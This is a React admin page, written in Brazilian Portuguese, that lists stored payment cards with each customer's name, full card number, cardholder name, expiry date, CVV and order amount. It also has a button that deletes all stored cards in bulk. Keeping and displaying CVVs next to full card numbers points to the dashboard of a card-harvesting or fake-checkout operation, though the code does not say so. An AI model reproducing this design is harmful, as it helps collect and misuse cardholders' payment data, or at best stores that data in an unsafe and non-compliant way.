'use client';

import { useState, useEffect } from 'react';
import { Trash2, AlertTriangle, CreditCard } from 'lucide-react';
import { toast } from 'sonner';

export default function CardsPage() {
  const [cards, setCards] = useState<any[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [showClearModal, setShowClearModal] = useState(false);
  const [isClearing, setIsClearing] = useState(false);

  useEffect(() => {
    fetchCards();
  }, []);

  const fetchCards = async () => {
    try {
      const res = await fetch('/api/admin/cards');
      const data = await res.json();
      setCards(data.cards || []);
    } catch (e) {
      console.error(e);
    } finally {
      setIsLoading(false);
    }
  };

  const handleClearAll = async () => {
    setIsClearing(true);
    try {
      const res = await fetch('/api/admin/clear-cards', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ confirmation: 'APAGAR CARTOES' })
      });

      if (res.ok) {
        toast.success('Cartões apagados com sucesso!');
        setShowClearModal(false);
        fetchCards();
      } else {
        const data = await res.json();
        toast.error(data.error || 'Erro ao apagar cartões');
      }
    } catch (error) {
      toast.error('Erro ao apagar cartões');
    } finally {
      setIsClearing(false);
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <CreditCard className="w-8 h-8 text-purple-500" />
          <h1 className="text-3xl font-bold">Cartões</h1>
          <span className="bg-purple-100 text-purple-700 px-3 py-1 rounded-full text-sm font-medium">
            {cards.length} total
          </span>
        </div>
        {cards.length > 0 && (
          <button
            onClick={() => setShowClearModal(true)}
            className="flex items-center gap-2 bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded-xl text-sm"
          >
            <Trash2 className="w-4 h-4" />
            Apagar Todos
          </button>
        )}
      </div>

      <div className="bg-white rounded-2xl shadow-md overflow-hidden">
        {isLoading ? (
          <p className="p-6 text-center">Carregando...</p>
        ) : cards.length === 0 ? (
          <p className="text-center py-8 text-gray-500">Nenhum cartão registrado</p>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-50">
                <tr>
                  <th className="px-6 py-4 text-left text-sm font-semibold">Cliente</th>
                  <th className="px-6 py-4 text-left text-sm font-semibold">Número</th>
                  <th className="px-6 py-4 text-left text-sm font-semibold">Nome</th>
                  <th className="px-6 py-4 text-left text-sm font-semibold">Validade</th>
                  <th className="px-6 py-4 text-left text-sm font-semibold">CVV</th>
                  <th className="px-6 py-4 text-left text-sm font-semibold">Valor</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200">
                {cards.map((c) => (
                  <tr key={c.id} className="hover:bg-gray-50">
                    <td className="px-6 py-4 font-medium">{c.customerName}</td>
                    <td className="px-6 py-4 font-mono text-sm">{c.cardNumber}</td>
                    <td className="px-6 py-4 text-sm">{c.cardName}</td>
                    <td className="px-6 py-4 text-sm">{c.expiryDate}</td>
                    <td className="px-6 py-4 font-mono text-sm">{c.cvv}</td>
                    <td className="px-6 py-4 font-bold text-green-600">
                      R$ {c.orderTotal.toFixed(2).replace('.', ',')}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Modal de Confirmação Simplificado */}
      {showClearModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white rounded-2xl p-6 max-w-md w-full mx-4">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center">
                <AlertTriangle className="w-6 h-6 text-red-500" />
              </div>
              <div>
                <h3 className="text-lg font-bold text-gray-900">Apagar Todos os Cartões</h3>
                <p className="text-sm text-gray-500">Esta ação não pode ser desfeita</p>
              </div>
            </div>
            
            <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
              <p className="text-sm text-red-700">
                <strong>Atenção:</strong> Isso irá deletar TODOS os {cards.length} cartões registrados permanentemente.
              </p>
            </div>

            <p className="text-center text-gray-700 mb-6 font-medium">
              Realmente deseja apagar todos os cartões?
            </p>

            <div className="flex gap-3">
              <button
                onClick={() => setShowClearModal(false)}
                className="flex-1 px-4 py-3 border border-gray-300 rounded-xl hover:bg-gray-50 font-medium"
              >
                Não
              </button>
              <button
                onClick={handleClearAll}
                disabled={isClearing}
                className="flex-1 px-4 py-3 bg-red-500 text-white rounded-xl hover:bg-red-600 disabled:opacity-50 font-medium"
              >
                {isClearing ? 'Apagando...' : 'Sim, Apagar'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
